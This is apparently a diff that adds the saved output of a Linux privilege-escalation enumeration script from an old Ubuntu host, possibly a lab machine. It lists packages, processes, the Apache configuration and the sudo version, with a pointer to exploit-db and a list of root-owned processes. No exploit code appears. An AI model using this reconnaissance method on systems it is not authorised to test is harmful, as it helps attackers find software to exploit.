+    krb5-locales 1.10+dfsg~beta1-2ubuntu0.3  support for MIT Kerberos
+    language-pack-en 1:12.04+20140106  updates for language English
+    language-pack-en-base 1:12.04+20140106  for language English
+    language-pack-gnome-en 1:12.04+20140106  translation updates for language English
+    language-pack-gnome-en-base 1:12.04+20140106  translations for language English
+    language-selector-common 0.79  selector for Ubuntu
+    laptop-detect 0.13.7ubuntu2  to detect a laptop
+    less 444-1ubuntu1  program similar to more
+    libaccountsservice0 0.6.15-2ubuntu9.3  and manipulate user account information - shared libraries
+    libacl1 2.2.51-5ubuntu1  control list shared library
+    libapr1 1.4.6-1  Portable Runtime Library
+    libaprutil1 1.3.12+dfsg-3  Portable Runtime Utility Library
+    libaprutil1-dbd-sqlite3 1.3.12+dfsg-3  Portable Runtime Utility Library - SQLite3 Driver
+    libaprutil1-ldap 1.3.12+dfsg-3  Portable Runtime Utility Library - LDAP Driver
+    libapt-inst1.4 0.8.16~exp12ubuntu10.2  package format runtime library
+    libapt-pkg4.12 0.8.16~exp12ubuntu10.2  managment runtime library
+    libasn1-8-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - ASN.1 library
+    libattr1 1:2.4.46-5ubuntu1  attribute shared library
+    libbind9-80 1:9.8.1.dfsg.P1-4ubuntu0.2  Shared Library used by BIND
+    libblkid1 2.20.1-1ubuntu3  device id library
+    libboost-iostreams1.46.1 1.46.1-7ubuntu3  Library
+    libbsd0 0.3.0-2  functions from BSD systems - shared library
+    libbz2-1.0 1.0.6-1  block-sorting file compressor library - runtime
+    libc-bin 2.15-0ubuntu10.7  GNU C Library: Binaries
+    libc-dev-bin 2.15-0ubuntu10.7  GNU C Library: Development binaries
+    libc6 2.15-0ubuntu10.7  GNU C Library: Shared libraries
+    libc6-dev 2.15-0ubuntu10.7  GNU C Library: Development Libraries and Header Files
+    libcap-ng0 0.6.6-1ubuntu1  alternate POSIX capabilities library
+    libcap2 1:2.22-1ubuntu3  for getting/setting POSIX.1e capabilities
+    libclass-accessor-perl 0.34-1  module that automatically generates accessors
+    libclass-isa-perl 0.36-3  the search path for a class's ISA tree
+    libcomerr2 1.42-1ubuntu2  error description library
+    libcurl3-gnutls 7.22.0-3ubuntu4  file transfer library (GnuTLS)
+    libcwidget3 0.5.16-3.1ubuntu1  terminal interface library for C++ (runtime files)
+    libdb5.1 5.1.25-11build1  v5.1 Database Libraries [runtime]
+    libdbus-1-3 1.4.18-1ubuntu1  interprocess messaging system (library)
+    libdbus-glib-1-2 0.98-1ubuntu1  interprocess messaging system (GLib-based shared library)
+    libdevmapper1.02.1 2:1.02.48-4ubuntu7.1  Linux Kernel Device Mapper userspace library
+    libdns81 1:9.8.1.dfsg.P1-4ubuntu0.2  Shared Library used by BIND
+    libdrm-intel1 2.4.32-1ubuntu1  interface to intel-specific kernel DRM services -- runtime
+    libdrm-nouveau1a 2.4.32-1ubuntu1  interface to nouveau-specific kernel DRM services -- runtime
+    libdrm-radeon1 2.4.32-1ubuntu1  interface to radeon-specific kernel DRM services -- runtime
+    libdrm2 2.4.32-1ubuntu1  interface to kernel DRM services -- runtime
+    libedit2 2.11-20080614-3ubuntu2  editline and history libraries
+    libelf1 0.152-1ubuntu3  to read and write ELF files
+    libept1.4.12 1.0.6~exp1ubuntu1  library for managing Debian package information
+    libexpat1 2.0.1-7.2ubuntu1.1  parsing C library - runtime library
+    libffi6 3.0.11~rc1-5  Function Interface library runtime
+    libfreetype6 2.4.8-1ubuntu2.1  2 font engine, shared library files
+    libfribidi0 0.19.2-1  Implementation of the Unicode BiDi algorithm
+    libfuse2 2.8.6-2ubuntu2  in Userspace (library)
+    libgcc1 1:4.6.3-1ubuntu5  support library
+    libgcrypt11 1.5.0-3ubuntu0.1  Crypto library - runtime library
+    libgdbm3 1.8.3-10  dbm database routines (runtime version)
+    libgeoip1 1.4.8+dfsg-2  IP-to-country resolver library
+    libgirepository-1.0-1 1.32.0-1  for handling GObject introspection data (runtime library)
+    libglib2.0-0 2.32.3-0ubuntu1  library of C routines
+    libgmp10 2:5.0.2+dfsg-2ubuntu1  arithmetic library
+    libgnutls26 2.12.14-5ubuntu3.1  TLS library - runtime library
+    libgomp1 4.6.3-1ubuntu5  OpenMP (GOMP) support library
+    libgpg-error0 1.10-2ubuntu1  for common error values and messages in GnuPG components
+    libgpm2 1.20.4-4  Purpose Mouse - shared library
+    libgssapi-krb5-2 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries - krb5 GSS-API Mechanism
+    libgssapi3-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - GSSAPI support library
+    libhcrypto4-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - crypto library
+    libheimbase1-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - Base library
+    libheimntlm0-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - NTLM support library
+    libhx509-5-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - X509 support library
+    libidn11 1.23-2  Libidn library, implementation of IETF IDN specifications
+    libio-string-perl 1.08-2  IO::File interface for in-core strings
+    libisc83 1:9.8.1.dfsg.P1-4ubuntu0.2  Shared Library used by BIND
+    libisccc80 1:9.8.1.dfsg.P1-4ubuntu0.2  Channel Library used by BIND
+    libisccfg82 1:9.8.1.dfsg.P1-4ubuntu0.2  File Handling Library used by BIND
+    libk5crypto3 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries - Crypto Library
+    libkeyutils1 1.5.2-2  Key Management Utilities (library)
+    libklibc 1.5.25-1ubuntu2  libc subset for use with initramfs
+    libkrb5-26-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - libraries
+    libkrb5-3 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries
+    libkrb5support0 1.10+dfsg~beta1-2ubuntu0.3  Kerberos runtime libraries - Support library
+    libldap-2.4-2 2.4.28-1.1ubuntu4.1  libraries
+    liblocale-gettext-perl 1.05-7build1  using libc functions for internationalization in Perl
+    liblockfile-bin 1.09-3  binaries for and cli utilities based on liblockfile
+    liblockfile1 1.09-3  locking library
+    liblwres80 1:9.8.1.dfsg.P1-4ubuntu0.2  Resolver Library used by BIND
+    liblzma5 5.1.1alpha+20110809-3  compression library
+    libmagic1 5.09-2  type determination library using "magic" numbers
+    libmount1 2.20.1-1ubuntu3  device id library
+    libmpc2 0.9-4  precision complex floating-point library
+    libmpfr4 3.1.0-3ubuntu2  precision floating-point computation
+    libncurses5 5.9-4  libraries for terminal handling
+    libncursesw5 5.9-4  libraries for terminal handling (wide character support)
+    libnewt0.52 0.52.11-2ubuntu10  Erik's Windowing Toolkit - text mode windowing with slang
+    libnfnetlink0 1.0.0-1  netlink library
+    libnih-dbus1 1.0.3-4ubuntu9  D-Bus Bindings Library
+    libnih1 1.0.3-4ubuntu9  Utility Library
+    libnl-3-200 3.2.3-2ubuntu2  for dealing with netlink sockets
+    libnl-genl-3-200 3.2.3-2ubuntu2  for dealing with netlink sockets - generic netlink
+    libp11-kit0 0.12-2ubuntu1  for loading and coordinating access to PKCS#11 modules - runtime
+    libpam-modules 1.1.3-7ubuntu2  Authentication Modules for PAM
+    libpam-modules-bin 1.1.3-7ubuntu2  Authentication Modules for PAM - helper binaries
+    libpam-runtime 1.1.3-7ubuntu2  support for the PAM library
+    libpam0g 1.1.3-7ubuntu2  Authentication Modules library
+    libparse-debianchangelog-perl 1.2.0-1ubuntu1  Debian changelogs and output them in other formats
+    libparted0debian1 2.3-8ubuntu5  partition manipulator - shared library
+    libpcap0.8 1.1.1-10  interface for user-level packet capture
+    libpci3 1:3.1.8-2ubuntu5  PCI Utilities (shared library)
+    libpciaccess0 0.12.902-1  PCI access library for X
+    libpcre3 8.12-4  5 Compatible Regular Expression Library - runtime files
+    libpipeline1 1.2.1-1  manipulation library
+    libplymouth2 0.8.2-2ubuntu30  boot animation and logger - shared libraries
+    libpng12-0 1.2.46-3ubuntu4  library - runtime
+    libpolkit-gobject-1-0 0.104-1ubuntu1  Authorization API
+    libpopt0 1.16-3ubuntu1  for parsing cmdline parameters
+    libpython2.7 2.7.3-0ubuntu3.5  Python runtime library (version 2.7)
+    libquadmath0 4.6.3-1ubuntu5  Quad-Precision Math Library
+    libreadline6 6.2-8  readline and history libraries, run-time libraries
+    libroken18-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - roken support library
+    librtmp0 2.4~20110711.gitc28f1bab-1  for RTMP streams (shared library)
+    libsasl2-2 2.1.25.dfsg1-3ubuntu0.1  SASL - authentication abstraction library
+    libsasl2-modules 2.1.25.dfsg1-3ubuntu0.1  SASL - pluggable authentication modules
+    libselinux1 2.1.0-4.1ubuntu1  runtime shared libraries
+    libsigc++-2.0-0c2a 2.2.10-0ubuntu2  Signal Framework for C++ - runtime
+    libslang2 2.2.4-3ubuntu1  programming library - runtime version
+    libsqlite3-0 3.7.9-2ubuntu1.1  3 shared library
+    libss2 1.42-1ubuntu2  interface parsing library
+    libssl1.0.0 1.0.1-4ubuntu5.3  shared libraries
+    libstdc++6 4.6.3-1ubuntu5  Standard C++ Library v3
+    libstdc++6-4.6-dev 4.6.3-1ubuntu5  Standard C++ Library v3 (development files)
+    libsub-name-perl 0.05-1build2  for assigning a new name to referenced sub
+    libswitch-perl 2.16-2  statement for Perl
+    libtasn1-3 2.10-1ubuntu1.1  ASN.1 structures (runtime)
+    libtext-charwidth-perl 0.04-7build1  display widths of characters on the terminal
+    libtext-iconv-perl 1.7-5  between character sets in Perl
+    libtext-wrapi18n-perl 0.06-7  substitute of Text::Wrap
+    libtimedate-perl 1.2000-1  of modules to manipulate date/time information
+    libtinfo5 5.9-4  low-level terminfo library for terminal handling
+    libudev0 175-0ubuntu9.1  library
+    libusb-0.1-4 2:0.1.12-20  USB programming library
+    libusb-1.0-0 2:1.0.9~rc3-2ubuntu1  USB programming library
+    libuuid1 2.20.1-1ubuntu3  Unique ID library
+    libwind0-heimdal 1.6~git20120311.dfsg.1-2  Kerberos - stringprep implementation
+    libwrap0 7.6.q-21  Venema's TCP wrappers library
+    libx11-6 2:1.4.99.1-0ubuntu2  client-side library
+    libx11-data 2:1.4.99.1-0ubuntu2  client-side library
+    libxapian22 1.2.8-1  engine library
+    libxau6 1:1.0.6-4  authorisation library
+    libxcb1 1.8.1-1  C Binding
+    libxdmcp6 1:1.1.0-4  Display Manager Control Protocol library
+    libxext6 2:1.3.0-3build1  miscellaneous extension library
+    libxml2 2.7.8.dfsg-5.1ubuntu4.1  XML library
+    libxmuu1 2:1.1.0-3  miscellaneous micro-utility library
+    linux-firmware 1.79  for Linux kernel drivers
+    linux-generic-pae 3.2.0.29.31  Generic Linux kernel
+    linux-image-3.2.0-29-generic-pae 3.2.0-29.46  kernel image for version 3.2.0 on 32 bit x86 SMP
+    linux-image-generic-pae 3.2.0.29.31  Linux kernel image
+    linux-libc-dev 3.2.0-69.103  Kernel Headers for development
+    locales 2.13+git20120306-3  files for locale support
+    lockfile-progs 0.1.16  for locking and unlocking files and mailboxes
+    login 1:4.1.4.2+svn3283-3ubuntu5  login tools
+    logrotate 3.7.8-6ubuntu5  rotation utility
+    lsb-base 4.0-0ubuntu20  Standard Base 4.0 init script functionality
+    lsb-release 4.0-0ubuntu20  Standard Base version reporting utility
+    lshw 02.15-2  about hardware configuration
+    lsof 4.81.dfsg.1-1build1  open files
+    ltrace 0.5.3-2.1ubuntu2  runtime library calls in dynamically linked programs
+    makedev 2.3.1-89ubuntu2  device files in /dev
+    man-db 2.6.1-2  manual pager
+    manpages 3.35-0.1ubuntu1  pages about using a GNU/Linux system
+    manpages-dev 3.35-0.1ubuntu1  pages about using GNU/Linux for development
+    mawk 1.3.3-17  pattern scanning and text processing language
+    memtest86+ 4.20-1.1ubuntu1  real-mode memory tester
+    mime-support 3.51-1ubuntu1  files 'mime.types' & 'mailcap', and support programs
+    mlocate 0.23.1-1ubuntu2  find files on the filesystem based on their name
+    module-init-tools 3.16-1ubuntu2  for managing Linux kernel modules
+    mount 2.20.1-1ubuntu3  for mounting and manipulating filesystems
+    mountall 2.36  mounting tool
+    mtr-tiny 0.80-1ubuntu1  screen ncurses traceroute tool
+    multiarch-support 2.15-0ubuntu10  package to ensure multiarch compatibility
+    nano 2.2.6-1  friendly text editor inspired by Pico
+    ncurses-base 5.9-4  terminal type definitions
+    ncurses-bin 5.9-4  programs and man pages
+    net-tools 1.60-24.1ubuntu2  NET-3 networking toolkit
+    netbase 4.47ubuntu1  TCP/IP networking system
+    netcat-openbsd 1.89-4ubuntu1  swiss army knife
+    ntfs-3g 1:2012.1.15AR.1-1ubuntu1  NTFS driver for FUSE
+    ntpdate 1:4.2.6.p3+dfsg-1ubuntu3.1  for setting system time from NTP servers
+    openssh-client 1:5.9p1-5ubuntu1.4  shell (SSH) client, for secure access to remote machines
+    openssh-server 1:5.9p1-5ubuntu1.4  shell (SSH) server, for secure access from remote machines
+    openssl 1.0.1-4ubuntu5.3  Socket Layer (SSL) binary and related cryptographic tools
+    os-prober 1.51ubuntu3  to detect other OSes on a set of drives
+    parted 2.3-8ubuntu5  partition manipulator
+    passwd 1:4.1.4.2+svn3283-3ubuntu5  and administer password and group data
+    pciutils 1:3.1.8-2ubuntu5  PCI Utilities
+    perl 5.14.2-6ubuntu2.1  Wall's Practical Extraction and Report Language
+    perl-base 5.14.2-6ubuntu2.1  Perl system
+    perl-modules 5.14.2-6ubuntu2.1  Perl modules
+    plymouth 0.8.2-2ubuntu30  boot animation and logger - main package
+    plymouth-theme-ubuntu-text 0.8.2-2ubuntu30  boot animation and logger - ubuntu-logo theme
+    popularity-contest 1.53ubuntu1  for your favourite packages automatically
+    powermgmt-base 1.31  utils and configs for power management
+    ppp 2.4.5-5ubuntu1  Protocol (PPP) - daemon
+    pppconfig 2.3.18+nmu3ubuntu1  text menu based utility for configuring ppp
+    pppoeconf 1.20ubuntu1  PPPoE/ADSL connections
+    procps 1:3.2.8-11ubuntu6  file system utilities
+    psmisc 22.15-2ubuntu1.1  that use the proc file system
+    python 2.7.3-0ubuntu2  high-level object-oriented language (default version)
+    python-apt 0.8.3ubuntu7  interface to libapt-pkg
+    python-apt-common 0.8.3ubuntu7  interface to libapt-pkg (locales)
+    python-chardet 2.0.1-2build1  character encoding detector
+    python-dbus 1.0.0-1ubuntu1  interprocess messaging system (Python interface)
+    python-dbus-dev 1.0.0-1ubuntu1  loop integration development files for python-dbus
+    python-debian 0.1.21ubuntu1  modules to work with Debian-related data formats
+    python-gdbm 2.7.3-1ubuntu1  dbm database support for Python
+    python-gi 3.2.2-1~precise  2.x bindings for gobject-introspection libraries
+    python-gnupginterface 0.3.2-9.1ubuntu3  interface to GnuPG (GPG)
+    python-minimal 2.7.3-0ubuntu2  subset of the Python language (default version)
+    python-xapian 1.2.8-1  search engine interface for Python
+    python2.7 2.7.3-0ubuntu3.5  high-level object-oriented language (version 2.7)
+    python2.7-minimal 2.7.3-0ubuntu3.5  subset of the Python language (version 2.7)
+    readline-common 6.2-8  readline and history libraries, common files
+    resolvconf 1.63ubuntu15  server information handler
+    rsync 3.0.9-1ubuntu1  versatile, remote (and local) file-copying tool
+    rsyslog 5.8.6-1ubuntu8  system and kernel logging daemon
+    sed 4.2.1-9  GNU sed stream editor
+    sensible-utils 0.0.6ubuntu2  for sensible alternative selection
+    sgml-base 1.26+nmu1ubuntu1  infrastructure and SGML catalog file support
+    ssh 1:5.9p1-5ubuntu1.4  shell client and server (metapackage)
+    ssh-import-id 2.10-0ubuntu1  retrieve an SSH public key and install it locally
+    ssl-cert 1.0.28ubuntu0.1  debconf wrapper for OpenSSL
+    strace 4.5.20-2.3ubuntu1  system call tracer
+    sudo 1.8.3p1-1ubuntu3.3  limited super user privileges to specific users
+    sysv-rc 2.88dsf-13.10ubuntu11.1  runlevel change mechanism
+    sysvinit-utils 2.88dsf-13.10ubuntu11.1  utilities
+    tar 1.26-4ubuntu1  version of the tar archiving utility
+    tasksel 2.88ubuntu9  for selecting tasks for installation on Debian systems
+    tasksel-data 2.88ubuntu9  tasks used for installation of Debian systems
+    tcpd 7.6.q-21  Venema's TCP wrapper utilities
+    tcpdump 4.2.1-1ubuntu2  network traffic analyzer
+    telnet 0.17-36build1  telnet client
+    time 1.7-23.1  GNU time program for measuring cpu resource usage
+    tzdata 2012e-0ubuntu0.12.04  zone and daylight-saving time data
+    ubuntu-keyring 2011.11.21  keys of the Ubuntu archive
+    ubuntu-minimal 1.267  core of Ubuntu
+    ubuntu-standard 1.267  Ubuntu standard system
+    ucf 3.0025+nmu2ubuntu1  Configuration File: preserve user changes to config files.
+    udev 175-0ubuntu9.1  device node and kernel event manager
+    ufw 0.31.1-1  for managing a Netfilter firewall
+    update-manager-core 1:0.156.14.9  release upgrades
+    upstart 1.5-0ubuntu7  init daemon
+    ureadahead 0.100.0-12  required files in advance
+    usbutils 1:005-1  USB utilities
+    util-linux 2.20.1-1ubuntu3  system utilities
+    uuid-runtime 2.20.1-1ubuntu3  components for the Universally Unique ID library
+    vim 2:7.3.429-2ubuntu2.1  IMproved - enhanced vi editor
+    vim-common 2:7.3.429-2ubuntu2.1  IMproved - Common files
+    vim-runtime 2:7.3.429-2ubuntu2.1  IMproved - Runtime files
+    vim-tiny 2:7.3.429-2ubuntu2.1  IMproved - enhanced vi editor - compact version
+    vsftpd 2.3.5-1ubuntu2  efficient FTP server written for security
+    wamerican 7.1-1  English dictionary words for /usr/share/dict
+    wbritish 7.1-1  English dictionary words for /usr/share/dict
+    wget 1.13.4-2ubuntu1  files from the web
+    whiptail 0.52.11-2ubuntu10  user-friendly dialog boxes from shell scripts
+    wireless-regdb 2011.04.28-1ubuntu3  regulatory database
+    xauth 1:1.0.6-1  authentication utility
+    xkb-data 2.5-1ubuntu1.3  Keyboard Extension (XKB) configuration data
+    xml-core 0.13  infrastructure and XML catalog file support
+    xz-lzma 5.1.1alpha+20110809-3  compression utilities - compatibility commands
+    xz-utils 5.1.1alpha+20110809-3  compression utilities
+    zlib1g 1:1.2.3.4.dfsg-3ubuntu4  library - runtime
+
+[+] Current processes
+    USER PID START TIME COMMAND
+    root 1 07:29 0:00 /sbin/init
+    root 2 07:29 0:00 [kthreadd]
+    root 3 07:29 0:00 [ksoftirqd/0]
+    root 4 07:29 0:08 [kworker/0:0]
+    root 5 07:29 0:00 [kworker/u:0]
+    root 6 07:29 0:00 [migration/0]
+    root 7 07:29 0:00 [watchdog/0]
+    root 8 07:29 0:00 [cpuset]
+    root 9 07:29 0:00 [khelper]
+    root 10 07:29 0:00 [kdevtmpfs]
+    root 11 07:29 0:00 [netns]
+    root 12 07:29 0:00 [sync_supers]
+    root 13 07:29 0:00 [bdi-default]
+    root 14 07:29 0:00 [kintegrityd]
+    root 15 07:29 0:00 [kblockd]
+    root 16 07:29 0:00 [ata_sff]
+    root 17 07:29 0:00 [khubd]
+    root 18 07:29 0:00 [md]
+    root 22 07:29 0:00 [khungtaskd]
+    root 23 07:29 0:00 [kswapd0]
+    root 24 07:29 0:00 [ksmd]
+    root 25 07:29 0:00 [fsnotify_mark]
+    root 26 07:29 0:00 [ecryptfs-kthrea]
+    root 27 07:29 0:00 [crypto]
+    root 35 07:29 0:00 [kthrotld]
+    root 36 07:29 0:00 [kworker/u:2]
+    root 57 07:29 0:00 [devfreq_wq]
+    root 224 07:29 0:00 [mpt_poll_0]
+    root 225 07:29 0:00 [mpt/0]
+    root 227 07:29 0:00 [scsi_eh_0]
+    root 234 07:29 0:01 [kworker/0:2]
+    root 242 07:29 0:00 [jbd2/sda1-8]
+    root 243 07:29 0:00 [ext4-dio-unwrit]
+    root 324 07:29 0:00 upstart-udev-bridge
+    root 326 07:29 0:00 /sbin/udevd
+    102 405 07:29 0:00 dbus-daemon
+    syslog 422 07:29 0:00 rsyslogd
+    root 505 07:29 0:00 /sbin/udevd
+    root 516 07:29 0:00 dhclient3
+    root 538 07:29 0:00 [kpsmoused]
+    root 545 07:29 0:00 /usr/sbin/sshd
+    root 556 07:29 0:00 /usr/sbin/vsftpd
+    root 563 07:29 0:00 /sbin/udevd
+    root 642 07:29 0:00 upstart-socket-bridge
+    root 702 07:29 0:00 /sbin/getty
+    root 705 07:29 0:00 /sbin/getty
+    root 710 07:29 0:00 /sbin/getty
+    root 715 07:29 0:00 /sbin/getty
+    root 717 07:29 0:00 /sbin/getty
+    root 732 07:29 0:00 cron
+    daemon 733 07:29 0:00 atd
+    root 766 07:29 0:00 /usr/sbin/apache2
+    www-data 769 07:29 0:00 /usr/sbin/apache2
+    www-data 770 07:29 0:00 /usr/sbin/apache2
+    www-data 771 07:29 0:00 /usr/sbin/apache2
+    root 851 07:29 0:00 /sbin/getty
+    root 896 07:29 0:00 [flush-8:0]
+    root 931 07:41 0:00 sshd:
+    noob 945 07:41 0:00 sshd:
+    noob 946 07:41 0:00 bash
+    noob 947 07:41 0:00 /bin/bash
+    noob 950 07:41 0:00 python
+    noob 951 07:41 0:00 /bin/bash
+    noob 978 07:46 0:00 python
+    noob 1230 07:46 0:00 /bin/sh
+    noob 1231 07:46 0:00 ps
+    noob 1232 07:46 0:00 awk
+
+[+] Apache Version and Modules
+    Server version: Apache/2.2.22 (Ubuntu)
+    Server built:   Jul 22 2014 14:37:08
+    Loaded Modules:
+    core_module (static)
+    log_config_module (static)
+    logio_module (static)
+    mpm_worker_module (static)
+    http_module (static)
+    so_module (static)
+    alias_module (shared)
+    auth_basic_module (shared)
+    authn_file_module (shared)
+    authz_default_module (shared)
+    authz_groupfile_module (shared)
+    authz_host_module (shared)
+    authz_user_module (shared)
+    autoindex_module (shared)
+    cgid_module (shared)
+    deflate_module (shared)
+    dir_module (shared)
+    env_module (shared)
+    mime_module (shared)
+    negotiation_module (shared)
+    reqtimeout_module (shared)
+    setenvif_module (shared)
+    status_module (shared)
+    Compiled in modules:
+    core.c
+    mod_log_config.c
+    mod_logio.c
+    worker.c
+    http_core.c
+    mod_so.c
+
+[+] Apache Config File
+    #
+    # Based upon the NCSA server configuration files originally by Rob McCool.
+    #
+    # This is the main Apache server configuration file.  It contains the
+    # configuration directives that give the server its instructions.
+    # See http://httpd.apache.org/docs/2.2/ for detailed information about
+    # the directives.
+    #
+    # Do NOT simply read the instructions in here without understanding
+    # what they do.  They're here only as hints or reminders.  If you are unsure
+    # consult the online docs. You have been warned.
+    #
+    # The configuration directives are grouped into three basic sections:
+    #  1. Directives that control the operation of the Apache server process as a
+    #     whole (the 'global environment').
+    #  2. Directives that define the parameters of the 'main' or 'default' server,
+    #     which responds to requests that aren't handled by a virtual host.
+    #     These directives also provide default values for the settings
+    #     of all virtual hosts.
+    #  3. Settings for virtual hosts, which allow Web requests to be sent to
+    #     different IP addresses or hostnames and have them handled by the
+    #     same Apache server process.
+    #
+    # Configuration and logfile names: If the filenames you specify for many
+    # of the server's control files begin with "/" (or "drive:/" for Win32), the
+    # server will use that explicit path.  If the filenames do *not* begin
+    # with "/", the value of ServerRoot is prepended -- so "foo.log"
+    # with ServerRoot set to "/etc/apache2" will be interpreted by the
+    # server as "/etc/apache2/foo.log".
+    #
+    ### Section 1: Global Environment
+    #
+    # The directives in this section affect the overall operation of Apache,
+    # such as the number of concurrent requests it can handle or where it
+    # can find its configuration files.
+    #
+    #
+    # ServerRoot: The top of the directory tree under which the server's
+    # configuration, error, and log files are kept.
+    #
+    # NOTE!  If you intend to place this on an NFS (or otherwise network)
+    # mounted filesystem then please read the LockFile documentation (available
+    # at <URL:http://httpd.apache.org/docs/2.2/mod/mpm_common.html#lockfile>);
+    # you will save yourself a lot of trouble.
+    #
+    # Do NOT add a slash at the end of the directory path.
+    #
+    #ServerRoot "/etc/apache2"
+    #
+    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+    #
+    LockFile ${APACHE_LOCK_DIR}/accept.lock
+    #
+    # PidFile: The file in which the server should record its process
+    # identification number when it starts.
+    # This needs to be set in /etc/apache2/envvars
+    #
+    PidFile ${APACHE_PID_FILE}
+    #
+    # Timeout: The number of seconds before receives and sends time out.
+    #
+    Timeout 300
+    #
+    # KeepAlive: Whether or not to allow persistent connections (more than
+    # one request per connection). Set to "Off" to deactivate.
+    #
+    KeepAlive On
+    #
+    # MaxKeepAliveRequests: The maximum number of requests to allow
+    # during a persistent connection. Set to 0 to allow an unlimited amount.
+    # We recommend you leave this number high, for maximum performance.
+    #
+    MaxKeepAliveRequests 100
+    #
+    # KeepAliveTimeout: Number of seconds to wait for the next request from the
+    # same client on the same connection.
+    #
+    KeepAliveTimeout 5
+    ##
+    ## Server-Pool Size Regulation (MPM specific)
+    ##
+    # prefork MPM
+    # StartServers: number of server processes to start
+    # MinSpareServers: minimum number of server processes which are kept spare
+    # MaxSpareServers: maximum number of server processes which are kept spare
+    # MaxClients: maximum number of server processes allowed to start
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_prefork_module>
+    StartServers          5
+    MinSpareServers       5
+    MaxSpareServers      10
+    MaxClients          150
+    MaxRequestsPerChild   0
+    </IfModule>
+    # worker MPM
+    # StartServers: initial number of server processes to start
+    # MinSpareThreads: minimum number of worker threads which are kept spare
+    # MaxSpareThreads: maximum number of worker threads which are kept spare
+    # ThreadLimit: ThreadsPerChild can be changed to this maximum value during a
+    #              graceful restart. ThreadLimit can only be changed by stopping
+    #              and starting Apache.
+    # ThreadsPerChild: constant number of worker threads in each server process
+    # MaxClients: maximum number of simultaneous client connections
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_worker_module>
+    StartServers          2
+    MinSpareThreads      25
+    MaxSpareThreads      75
+    ThreadLimit          64
+    ThreadsPerChild      25
+    MaxClients          150
+    MaxRequestsPerChild   0
+    </IfModule>
+    # event MPM
+    # StartServers: initial number of server processes to start
+    # MinSpareThreads: minimum number of worker threads which are kept spare
+    # MaxSpareThreads: maximum number of worker threads which are kept spare
+    # ThreadsPerChild: constant number of worker threads in each server process
+    # MaxClients: maximum number of simultaneous client connections
+    # MaxRequestsPerChild: maximum number of requests a server process serves
+    <IfModule mpm_event_module>
+    StartServers          2
+    MinSpareThreads      25
+    MaxSpareThreads      75
+    ThreadLimit          64
+    ThreadsPerChild      25
+    MaxClients          150
+    MaxRequestsPerChild   0
+    </IfModule>
+    # These need to be set in /etc/apache2/envvars
+    User ${APACHE_RUN_USER}
+    Group ${APACHE_RUN_GROUP}
+    #
+    # AccessFileName: The name of the file to look for in each directory
+    # for additional configuration directives.  See also the AllowOverride
+    # directive.
+    #
+    AccessFileName .htaccess
+    #
+    # The following lines prevent .htaccess and .htpasswd files from being
+    # viewed by Web clients.
+    #
+    <Files ~ "^\.ht">
+    Order allow,deny
+    Deny from all
+    Satisfy all
+    </Files>
+    #
+    # DefaultType is the default MIME type the server will use for a document
+    # if it cannot otherwise determine one, such as from filename extensions.
+    # If your server contains mostly text or HTML documents, "text/plain" is
+    # a good value.  If most of your content is binary, such as applications
+    # or images, you may want to use "application/octet-stream" instead to
+    # keep browsers from trying to display binary files as though they are
+    # text.
+    #
+    # It is also possible to omit any default MIME type and let the
+    # client's browser guess an appropriate action instead. Typically the
+    # browser will decide based on the file's extension then. In cases
+    # where no good assumption can be made, letting the default MIME type
+    # unset is suggested  instead of forcing the browser to accept
+    # incorrect  metadata.
+    #
+    DefaultType None
+    #
+    # HostnameLookups: Log the names of clients or just their IP addresses
+    # e.g., www.apache.org (on) or 204.62.129.132 (off).
+    # The default is off because it'd be overall better for the net if people
+    # had to knowingly turn this feature on, since enabling it means that
+    # each client request will result in AT LEAST one lookup request to the
+    # nameserver.
+    #
+    HostnameLookups Off
+    # ErrorLog: The location of the error log file.
+    # If you do not specify an ErrorLog directive within a <VirtualHost>
+    # container, error messages relating to that virtual host will be
+    # logged here.  If you *do* define an error logfile for a <VirtualHost>
+    # container, that host's errors will be logged there and not here.
+    #
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    #
+    # LogLevel: Control the number of messages logged to the error_log.
+    # Possible values include: debug, info, notice, warn, error, crit,
+    # alert, emerg.
+    #
+    LogLevel warn
+    # Include module configuration:
+    Include mods-enabled/*.load
+    Include mods-enabled/*.conf
+    # Include all the user configurations:
+    Include httpd.conf
+    # Include ports listing
+    Include ports.conf
+    #
+    # The following directives define some format nicknames for use with
+    # a CustomLog directive (see below).
+    # If you are behind a reverse proxy, you might want to change %h into %{X-Forwarded-For}i
+    #
+    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O" common
+    LogFormat "%{Referer}i -> %U" referer
+    LogFormat "%{User-agent}i" agent
+    # Include of directories ignores editors' and dpkg's backup files,
+    # see README.Debian for details.
+    # Include generic snippets of statements
+    Include conf.d/
+    # Include the virtual host configurations:
+    Include sites-enabled/
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.8.3p1
+    Sudoers policy plugin version 1.8.3p1
+    Sudoers file grammar version 40
+    Sudoers I/O plugin version 1.8.3p1
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 4 07:29 0:08 [kworker/0:0]
+    root 702 07:29 0:00 /sbin/getty
+    root 710 07:29 0:00 /sbin/getty
+    root 538 07:29 0:00 [kpsmoused]
+    root 26 07:29 0:00 [ecryptfs-kthrea]
+    root 2 07:29 0:00 [kthreadd]
+    root 324 07:29 0:00 upstart-udev-bridge
+    root 766 07:29 0:00 /usr/sbin/apache2
+        Possible Related Packages: 
+             apache2 2.2.22-1ubuntu1.7  HTTP Server metapackage
